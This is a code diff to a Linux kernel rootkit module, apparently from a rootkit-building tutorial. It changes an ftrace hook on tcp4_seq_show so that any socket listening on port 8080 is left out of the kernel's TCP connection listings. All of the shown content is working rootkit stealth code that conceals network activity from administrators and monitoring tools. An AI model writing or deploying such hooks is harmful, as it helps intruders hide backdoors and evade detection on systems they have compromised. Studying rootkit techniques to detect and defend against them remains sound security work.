@@ -3,7 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
-#include <linux/net.h>
+#include <linux/tcp.h>
 
 #include "ftrace_helper.h"
 
@@ -23,11 +23,14 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 	long ret;
 	struct sock *sk = v;
 
-	printk(KERN_DEBUG "rootkit: entered hooked function!\n");
+	/* 0x1f90 = 8080 in hex */
+	if (sk != 0x1 && sk->sk_num == 0x1f90)
+	{
+		printk(KERN_DEBUG "rootkit: Found process listening on port 8080 - hiding!\n");
+		return 0;
+	}
 	
 	ret = orig_tcp4_seq_show(seq, v);
-
-	printk(KERN_DEBUG "rootkit: returning!\n");
 	return ret;
 }
 
